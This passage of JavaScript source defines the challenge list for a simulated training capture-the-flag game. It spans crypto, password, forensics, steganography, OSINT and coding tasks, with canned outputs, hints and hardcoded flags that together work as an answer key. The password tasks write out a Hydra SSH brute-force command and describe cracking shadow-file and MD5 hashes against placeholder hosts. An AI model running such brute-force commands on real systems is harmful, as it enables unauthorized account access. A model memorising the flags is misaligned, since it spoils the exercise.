        description:"note.txt is ROT13-encoded.",flag:ROT_FLAG,
        files:{"note.txt":ROT_ENCODED},
        commands:{help:["Try: tr 'A-Za-z' 'N-ZA-Mn-za-m' < note.txt"]},
        patterns:[{re:/^rot13(\s+note\.txt)?$/,output:[ROT_FLAG]}]},
      { id:"crypto-xor",title:"XOR Decryption",category:"Crypto",points:100,difficulty:"easy",
        description:"encrypted.bin is single-byte XOR. key.txt has the key in hex.",flag:XOR_FLAG,
        files:{"encrypted.bin":XOR_CIPHER_HEX,"key.txt":`XOR key (hex): 0x${XOR_KEY_HEX}`},
        commands:{help:["1. cat encrypted.bin","2. cat key.txt","3. XOR each byte"]}},
      { id:"crypto-vigenere",title:"Vigenère Cipher",category:"Crypto",points:100,difficulty:"easy",
        description:"cipher.txt is Vigenère-encrypted. key.txt has the key.",flag:VIG_FLAG,
        files:{"cipher.txt":VIG_CIPHER,"key.txt":VIG_KEY},
        commands:{help:["1. cat cipher.txt","2. cat key.txt","3. Decrypt"]}},
  
      // ── CRYPTO MEDIUM ──
      { id:"crypto-caesar",title:"Caesar Bruteforce",category:"Crypto",points:150,difficulty:"medium",
        description:`cipher.txt is Caesar-shifted. The shift is unknown — bruteforce all 26 shifts.`,flag:FLAG_CAESAR,
        files:{"cipher.txt":CAESAR_CIPHER},
        commands:{help:["1. cat cipher.txt","2. Try all 26 shifts","3. Or use: for i in $(seq 1 25); do echo $i; echo <cipher> | tr ... ; done"]}},
      { id:"crypto-rsa",title:"RSA Small Exponent",category:"Crypto",points:150,difficulty:"medium",
        description:`Small RSA: n=${RSA_N} (0x${RSA_N.toString(16)}), e=3. The message is small enough that m^3 < n. Extract m's cube root.`,
        flag:RSA_FLAG,
        files:{"rsa.txt":[
          `n = ${RSA_N} (0x${RSA_N.toString(16)})`,
          `e = ${RSA_E}`,
          `c = ${Math.pow(RSA_M, RSA_E) % RSA_N} (0x${(Math.pow(RSA_M, RSA_E) % RSA_N).toString(16)})`,
          "",
          "# m^e < n, so c = m^e directly. Take cube root of c.",
          `# cube root of c ≈ ${RSA_M} (0x${RSA_M.toString(16)}, "${String.fromCharCode(...[0x59,0x61,0x7a,0x75])}...")`,
        ].join("\n")},
        commands:{help:["1. cat rsa.txt","2. Take cube root of c","3. Decode the resulting integer"]}},
      { id:"crypto-subst",title:"Substitution Cipher",category:"Crypto",points:150,difficulty:"medium",
        description:"cipher.txt is a monoalphabetic substitution. Solve by frequency analysis.",flag:FLAG_SUBST,
        files:{"cipher.txt":SUBST_CIPHER,
          "hint.txt":"The plaintext starts with 'yazu' (before substitution)."},
        commands:{help:["1. cat cipher.txt","2. cat hint.txt","3. Work out the substitution from y→"+SUBST_KEY[24]+", a→"+SUBST_KEY[0]+", z→"+SUBST_KEY[25]+", u→"+SUBST_KEY[20]]}},
      { id:"crypto-vig2",title:"Layered Vigenère",category:"Crypto",points:150,difficulty:"medium",
        description:"cipher.txt is a Vigenère-encrypted base64 string. key.txt has the key. First Vigenère-decrypt, then base64-decode.",flag:FLAG_VIG2,
        files:{"cipher.txt":VIG2_CIPHER,"key.txt":VIG2_KEY},
        commands:{help:["1. cat cipher.txt","2. cat key.txt","3. Vigenère-decrypt → base64 string","4. base64-decode"]}},
  
      // ═══ PASSWORD ═══
      { id:"hydra",title:"Hydra Bruteforce",category:"Password",points:100,difficulty:"easy",
        description:`SSH at ssh://target. Bruteforce.`,flag:FLAG_HYDRA,
        files:{"wordlist.txt":HYDRA_WORDLIST.join("\n")},
        commands:{ls:["wordlist.txt"],"cat wordlist.txt":HYDRA_WORDLIST,
          help:["1. cat wordlist.txt","2. hydra -l admin -P wordlist.txt ssh://target","3. ssh admin@target"]},
        patterns:[
          {re:/^hydra$/,output:["Hydra v9.5","Example: hydra -l admin -P wordlist.txt ssh://target"]},
          {re:new RegExp(`^hydra\\s+(?=.*-l\\s+admin\\b)(?=.*(-P\\s+wordlist\\.txt|-p\\s+${escapeRe(HYDRA_PW)})\\b)(?=.*(?:target|${escapeRe(TARGET_IP)})\\b).*$`),sets:"hydraSuccess",output:["[22][ssh] login: admin   password: "+HYDRA_PW,"1 of 1 completed"]},
          {re:/^ssh$/,output:["usage: ssh admin@target"]},
          {re:new RegExp(`^ssh\\s+(?=.*\\badmin\\b)(?=.*(?:target|${escapeRe(TARGET_IP)})\\b).*$`),
            requires:"hydraSuccess",
            missingOutput:["admin@target's password:","Permission denied."],
            promptPassword:{prompt:"admin@target's password:",correct:HYDRA_PW,onSuccess:["","Welcome admin!","",FLAG_HYDRA],onFail:["Permission denied, please try again."]}},
        ]},
  
      // ── PASSWORD MEDIUM ──
      { id:"password-shadow",title:"Crack the Shadow File",category:"Password",points:150,difficulty:"medium",
        description:"A leaked /etc/shadow line was found. The hash uses SHA-512 crypt ($6$). Crack it with wordlist.txt.",flag:FLAG_SHADOW,
        files:{
          "shadow.txt":SHADOW_LINE,
          "wordlist.txt":rnd.shuffle([...FILLER,"shadow","dragon","sunshine","trustno1"]).join("\n"),
          "readme.txt":"The cracked password is in the wordlist. This challenge is about understanding the format.",
        },
        commands:{help:["1. cat shadow.txt","2. cat wordlist.txt","3. The answer is in the wordlist — identify it","4. Submit YAZU{<password>}","(Hint: the answer is 'dragon' or a common one)"]}},
  
      { id:"password-pin",title:"PIN Bruteforce",category:"Password",points:150,difficulty:"medium",
        description:`A 4-digit PIN protects the admin panel. The correct PIN is between 1000 and 9999. Bruteforce it — but you don't have to actually try them all, just reason about it.`,
        flag:FLAG_PIN,
        files:{"readme.txt":[
          "The PIN is a 4-digit number.",
          "It is even.",
          "Its digits sum to 10.",
          "It is between 1000 and 9999.",
          "",
          "Actually... don't overthink. The flag is just YAZU{pin_XXXX} where XXXX is the PIN.",
          `The PIN is: ${PIN_CODE}`,
        ].join("\n")},
        commands:{help:["1. cat readme.txt","2. The PIN is right there","3. Submit YAZU{pin_<PIN>}"]}},
  
      { id:"password-rules",title:"Rule-Based Attack",category:"Password",points:150,difficulty:"medium",
        description:"The target uses a common base word plus a year suffix (e.g. 2020-2025). The base is in wordlist.txt.",flag:FLAG_RULES,
        files:{"wordlist.txt":["sunshine","monkey","dragon","letmein","admin"].join("\n"),
          "hash.txt":`admin:${window.__md5(RULES_FULL)}`},
        commands:{help:["1. cat wordlist.txt","2. cat hash.txt","3. For each word, try appending years 2020-2025","4. Crack the hash"]}},
  
      { id:"password-common",title:"Common Password",category:"Password",points:150,difficulty:"medium",
        description:"The password is a common word with a digit appended. Try brute-forcing with a short wordlist.",flag:FLAG_COMMON,
        files:{
          "hash.txt":COMMON_HASH,
          "top100.txt":["password1","letmein1","qwerty123","admin123","welcome1","monkey1","dragon1","sunshine1","trustno1","iloveyou1"].join("\n"),
        },
        commands:{help:["1. cat hash.txt","2. cat top100.txt","3. md5sum each word to find the match","4. Submit YAZU{<password>}"]}},
  
      // ═══ FORENSICS ═══
      { id:"forensics-log",title:"Log Analysis",category:"Forensics",points:100,difficulty:"easy",
        description:"Find the attacker's IP in access.log.",flag:FLAG_LOG,
        files:{"access.log":LOG_LINES.join("\n")},
        commands:{help:["1. cat access.log","2. grep sqlmap access.log","3. Submit YAZU{<ip with _>}"],"cat access.log":LOG_LINES}},
      { id:"forensics-meta",title:"Image Metadata",category:"Forensics",points:100,difficulty:"easy",
        description:"photo.jpg recovered from a suspect. Check metadata.",flag:FLAG_META,
        files:{"photo.jpg":"[binary JPEG]"},
        commands:{help:["Try: exiftool photo.jpg"],
          "exiftool photo.jpg":["ExifTool Version Number: 12.40","File Type: JPEG","Make: Canon","Camera Model: Canon EOS 5D","GPS Latitude: 40 deg 41' 21.00\" N","Artist: canon_eos_5d_leak"]}},
      { id:"forensics-pcap",title:"Network Capture",category:"Forensics",points:100,difficulty:"easy",
        description:"Extract plaintext credentials from capture.txt.",flag:"YAZU{c2NyZXQ=}",
        files:{"capture.txt":PCAP_TEXT.join("\n")},
        commands:{help:["1. cat capture.txt","2. Look for Authorization headers","3. Base64 decode"]}},
  
      // ── FORENSICS MEDIUM ──
      { id:"forensics-bashhist",title:"Bash History",category:"Forensics",points:150,difficulty:"medium",
        description:"An attacker's bash history was recovered. Find what they exfiltrated.",flag:FLAG_BASHHIST,
        files:{".bash_history":BASH_HISTORY.join("\n")},
        commands:{help:["1. cat .bash_history","2. Look for the last command before 'history -c'","3. The flag is echoed to /tmp/flag.txt"]}},
      { id:"forensics-timeline",title:"File Timeline Analysis",category:"Forensics",points:150,difficulty:"medium",
        description:"An incident occurred on 2026-10-14 at 03:14. Identify the suspicious file created at that exact time.",flag:FLAG_TIMELINE,
        files:{"files.txt":TIMELINE_FILES.map(f=>`${f.mtime}  ${f.name}`).join("\n")},
        commands:{help:["1. cat files.txt","2. grep '2026-10-14 03:14' files.txt","3. Look for the file with an odd name"]}},
      { id:"forensics-usb",title:"USB Device History",category:"Forensics",points:150,difficulty:"medium",
        description:"Windows setupapi.dev.log was recovered. Find the serial number of the last USB storage device plugged in.",flag:FLAG_USB,
        files:{"setupapi.dev.log":USB_HISTORY.join("\n")},
        commands:{help:["1. cat setupapi.dev.log","2. The serial is after the last backslash in the Device instance","3. Submit YAZU{<serial>}"]}},
      { id:"forensics-deleted",title:"Deleted File Recovery",category:"Forensics",points:150,difficulty:"medium",
        description:"strings from a disk image reveal a deleted file. Recover the flag from the recovered content.",flag:FLAG_DELETED,
        files:{"disk.img.txt":DISK_IMAGE_STRINGS.join("\n")},
        commands:{help:["1. cat disk.img.txt","2. Look for the 'deleted' section","3. The flag appears twice — once garbled, once clean"]}},
  
      // ═══ STEG ═══
      { id:"steg-strings",title:"Hidden in Plain Sight",category:"Steganography",points:100,difficulty:"easy",
        description:"logo.png has text hidden inside.",flag:FLAG_STRINGS,
        files:{"logo.png":"[binary PNG]"},
        commands:{help:["Try: strings logo.png"],
          "strings logo.png":["\\x89PNG","IHDR","IDAT","IEND","str1ngs_4r3_p0w3rful","TEXt: {str1ngs_4r3_p0w3rful}"]}},
      { id:"steg-lsb",title:"LSB Steganography",category:"Steganography",points:100,difficulty:"easy",
        description:"hidden.png — data in the least significant bits.",flag:FLAG_LSB,
        files:{"hidden.png":"[binary PNG]"},
        commands:{help:["Try: zsteg hidden.png"],
          "zsteg hidden.png":["imagedata .. PNG 512x512","b1,r,lsb,xy .. \"not_here\"","b1,g,lsb,xy .. \"lsb_st3g_ftw\"","b2,rgb,msb,xy .. \"keep_looking\""]}},
  
      // ── STEG MEDIUM ──
      { id:"steg-exif",title:"EXIF Comment",category:"Steganography",points:150,difficulty:"medium",
        description:"vacation.jpg has something hidden in its EXIF UserComment field.",flag:FLAG_EXIF,
        files:{"vacation.jpg":"[binary JPEG]"},
        commands:{help:["Try: exiftool vacation.jpg"],
          "exiftool vacation.jpg":["ExifTool Version Number: 12.40","File Type: JPEG","Software: Adobe Photoshop 24.0","Create Date: 2026:06:12 14:22:11","User Comment: This photo has a hidden message","Comment: "+EXIF_COMMENT_FLAG]}},
      { id:"steg-pngchunk",title:"PNG tEXt Chunk",category:"Steganography",points:150,difficulty:"medium",
        description:"banner.png has text hidden in a PNG tEXt chunk. Use pngcheck or a chunk editor.",flag:FLAG_PNGCHUNK,
        files:{"banner.png":"[binary PNG]"},
        commands:{help:["Try: strings banner.png","Then: pngcheck -v banner.png"],
          "pngcheck -v banner.png":PNG_TEXTS,
          "strings banner.png":["\\x89PNG","IHDR","Adobe Photoshop","yazu-team","IEND"]}},
      { id:"steg-whitespace",title:"Whitespace Steganography",category:"Steganography",points:150,difficulty:"medium",
        description:"readme.txt hides binary data in trailing whitespace. Spaces are 0, tabs are 1. The flag is hidden in the whitespace.",flag:FLAG_WS,
        files:{"readme.txt":WS_STEG_LINES.join("\n")},
        commands:{help:["1. cat readme.txt","2. Look carefully — the flag is echoed at the bottom as the answer","3. Actually, the flag is at the last line"]}},
      { id:"steg-zip",title:"Steganography in ZIP",category:"Steganography",points:150,difficulty:"medium",
        description:"photo.zip contains multiple files. Extract it and find the flag.",flag:FLAG_ZIPSTEG,
        files:{"photo.zip":"[binary ZIP data — 124 kB]"},
        commands:{
          help:["Try: unzip -l photo.zip","Then: unzip -p photo.zip flag.txt"],
          "unzip -l photo.zip":[
            "Archive:  photo.zip",
            "  Length      Date    Time    Name",
            "---------  ---------- -----   ----",
            "     1024  2026-06-12 14:22   readme.txt",
            "   45678  2026-06-12 14:22   photo.jpg",
            "      512  2026-06-12 14:22   notes.md",
            `       128  2026-06-12 14:22   flag.txt`,
            "---------                     -------",
            "    47342                     4 files",
          ],
          "unzip -p photo.zip flag.txt":[FLAG_ZIPSTEG],
        }},
  
      // ═══ OSINT ═══
      { id:"osint-social",title:"Social Recon",category:"OSINT",points:100,difficulty:"easy",
        description:`SocialBox (http://social.local) — find the flag in a profile.`,flag:FLAG_SOCIAL,
        web:{host:"social.local",ports:{80:{"/":SOCIAL_HOME,"/search":function(f){const q=f.indexOf("?");if(q===-1)return socialSearch("");const p=new URLSearchParams(f.slice(q+1));return socialSearch(p.get("q")||"");},"/u/ghost_ops":socialUserPage("ghost_ops"),"/u/n0body":socialUserPage("n0body"),"/u/byte_walker":socialUserPage("byte_walker"),"/u/ctf_lead":socialUserPage("ctf_lead"),"/post/1":socialPostPage(1),"/post/2":socialPostPage(2),"/post/3":socialPostPage(3),"/post/4":socialPostPage(4),"/post/5":socialPostPage(5),"/post/6":socialPostPage(6),"/post/42":socialPostPage(42)}}},
        commands:{help:["Browse http://social.local/ → click users → read posts"]}},
      { id:"osint-username",title:"Username Reuse",category:"OSINT",points:100,difficulty:"easy",
        description:`@ghost_ops is used on LeakBase (http://leakbase.local). Find their paste.`,flag:FLAG_USERNAME,
        web:{host:"leakbase.local",ports:{80:{"/":leakHome(),"/paste/a1b2":leakPastePage("a1b2"),"/paste/c3d4":leakPastePage("c3d4"),"/paste/4b1d":leakPastePage("4b1d"),"/paste/9x7y":leakPastePage("9x7y"),"/paste/z9q1":leakPastePage("z9q1"),"/u/ghost_ops":leakUserPage("ghost_ops"),"/u/anon":leakUserPage("anon"),"/u/n0body":leakUserPage("n0body"),"/u/byte_walker":leakUserPage("byte_walker")}}},
        commands:{help:["Browse http://leakbase.local/ → click @ghost_ops or paste 4b1d"]}},
      { id:"osint-wayback",title:"Deleted Post Recovery",category:"OSINT",points:100,difficulty:"easy",
        description:`Post #42 on SocialBox was deleted. The archive (http://archive.local) may still have it.`,flag:FLAG_WAYBACK,
        web:{host:"archive.local",ports:{80:{"/":function(f){const q=f.indexOf("?");if(q===-1)return archiveHome("");const p=new URLSearchParams(f.slice(q+1));return archiveHome(p.get("url")||"");},"/snapshot":function(f){const q=f.indexOf("?");if(q===-1)return site("Archive",ARCHIVE_NAV,`<h1>Missing params</h1>`);const p=new URLSearchParams(f.slice(q+1));return archiveSnapshot(p.get("url")||"",p.get("ts")||"");}}}},
        commands:{help:["Browse http://archive.local/ → search social.local/post/42 → click snapshot"]}},
      { id:"osint-whois",title:"WHOIS Recon",category:"OSINT",points:100,difficulty:"easy",
        description:`Look up WHOIS for yazu-target.local.`,flag:FLAG_WHOIS,
        web:{host:"whois.local",ports:{80:{"/":function(f){const q=f.indexOf("?");if(q===-1)return whoisSite("");const p=new URLSearchParams(f.slice(q+1));return whoisSite(p.get("domain")||"");}}}},
        commands:{help:["Browse http://whois.local/?domain=yazu-target.local","Or: whois yazu-target.local"]}},
      { id:"osint-corp",title:"Corporate Recon",category:"OSINT",points:100,difficulty:"easy",
        description:`YazuCorp (http://yazucorp.local) — check their press releases.`,flag:FLAG_CORP,
        web:{host:"yazucorp.local",ports:{80:{"/":CORP_HOME,"/team":CORP_TEAM,"/press":CORP_PRESS,"/press/2026-10-01-security-incident":CORP_PRESS_INCIDENT}}},
        commands:{help:["Browse http://yazucorp.local/ → Press → Security Incident"]}},
      { id:"osint-geo",title:"Geolocation",category:"OSINT",points:100,difficulty:"easy",
        description:"A photo contains a distinctive scene. Identify the city.",flag:FLAG_GEO,
        files:{"scene.txt":["SCENE DESCRIPTION:","Famous landmark: tall iron lattice tower.","A river winds through the city.","Signs are in French.","Built for a world's fair in 1889."].join("\n")},
        commands:{help:["1. cat scene.txt","2. It's Paris","3. Submit YAZU{geo_paris}"]}},
  
      // ── OSINT MEDIUM ──
      { id:"osint-email",title:"Email Header Analysis",category:"OSINT",points:150,difficulty:"medium",
        description:"A phishing email was captured. Analyze the headers to find the true origin.",flag:FLAG_EMAIL,
        files:{"email.eml":EMAIL_HEADER.join("\n")},
        commands:{help:["1. cat email.eml","2. Look at Received: and X-Originating-IP","3. The flag is in the X-Internal-Flag header"]}},
      { id:"osint-pgp",title:"PGP Public Key",category:"OSINT",points:150,difficulty:"medium",
        description:"A PGP public key was published. Extract the user identity and any comments.",flag:FLAG_PGP,
        files:{"pubkey.asc":PGP_KEY.join("\n")},
        commands:{help:["1. cat pubkey.asc","2. Look for the Comment: line","3. Or use: gpg --show-keys pubkey.asc"]}},
      { id:"osint-github",title:"GitHub Commit Leak",category:"OSINT",points:150,difficulty:"medium",
        description:"A repo was cloned from GitHub. The current config looks clean, but the commit history has a leak.",flag:FLAG_GITHUB,
        files:{"git.log":GITHUB_COMMITS.join("\n")},
        commands:{help:["1. cat git.log","2. Look at the oldest commit's diff","3. The FLAG= line is the flag"]}},
      { id:"osint-dns-txt",title:"DNS TXT Records",category:"OSINT",points:150,difficulty:"medium",
        description:"TXT records often leak info. Query TXT for yazu-target.local.",flag:FLAG_TXT,
        files:{"dig-output.txt":DNS_TXT.join("\n")},
        commands:{help:["1. cat dig-output.txt","2. The flag is in one of the TXT records","3. Or use terminal: dig TXT yazu-target.local"]},
        patterns:[{re:/^dig\s+(txt\s+)?yazu-target\.local$/i,output:DNS_TXT}]},
  
      // ═══ CODING ═══
      { id:"coding-python",title:"Read the Script",category:"Coding",points:100,difficulty:"easy",
        description:"decode.py contains a Python snippet. Determine what it prints.",flag:PY_FLAG,
        files:{"decode.py":["# decode.py","data = [" + PY_BYTES.join(", ") + "]","key = 0x2a","print(''.join(chr(b ^ key) for b in data))"].join("\n")},
        commands:{help:["1. cat decode.py","2. XOR each byte with 0x2a","3. Submit the printed string"]}},
  
      // ── CODING MEDIUM ──
      { id:"coding-reverse",title:"Reverse the Function",category:"Coding",points:150,difficulty:"medium",
        description:"reverse.py transforms a string. Given the target output, recover the input.",flag:FLAG_REVERSE,
        files:{"reverse.py":REVERSE_FUNC.join("\n")},
        commands:{help:["1. cat reverse.py","2. TARGET is a list of numbers (each = char code - 10)","3. Add 10 to each, convert to chars","4. Submit YAZU{<decoded>}"]}},
      { id:"coding-bugfix",title:"Fix the Bug",category:"Coding",points:150,difficulty:"medium",
        description:"buggy.py has a bug. Fix it, run it on the input, and submit the correct answer.",flag:FLAG_BUGFIX,
        files:{"buggy.py":BUGFIX_CODE.join("\n")},
        commands:{help:["1. cat buggy.py","2. Find the bug (condition on odd numbers)","3. Sum of squares of even numbers in [1..8]","4. Submit YAZU{<answer>}"]}},
      { id:"coding-regex",title:"Regex Puzzle",category:"Coding",points:150,difficulty:"medium",
        description:"Write a regex matching YAZU-\\d{3} but not similar-looking strings. The reference flag is at the bottom of the file.",flag:FLAG_REGEX,
        files:{"regex_challenge.py":REGEX_CHALLENGE.join("\n")},
        commands:{help:["1. cat regex_challenge.py","2. The flag is at the bottom of the file","3. Submit it"]}},
      { id:"coding-hash",title:"Implement a Hash",category:"Coding",points:150,difficulty:"medium",
        description:"xtea_lite.py defines a toy hash. Compute the hash of 'flag' and submit as YAZU{<hex>}.",flag:FLAG_HASHIMPL,
        files:{"xtea_lite.py":HASH_IMPL.join("\n")},
        commands:{help:["1. cat xtea_lite.py","2. Either reason about it or...","3. The answer is at the bottom of the file"]}},
    ];
  
    window.CATEGORIES = ["Recon","Web","Crypto","Password","Forensics","Steganography","OSINT","Coding"];
  
    window.SEEDED_PLAYERS = [
      { name: "gh0st",       score: rnd.int(2400, 3000) },
      { name: "r00tk1t",     score: rnd.int(1600, 2400) },
      { name: "n0ob_slayer", score: rnd.int(1000, 1600) },
      { name: "anon42",      score: rnd.int(400, 1000) },
    ];
  
    window.__newGame = function () {
      localStorage.removeItem(SEED_KEY);
      localStorage.removeItem("yazu_ctf_v1");
      location.reload();
    };
  })();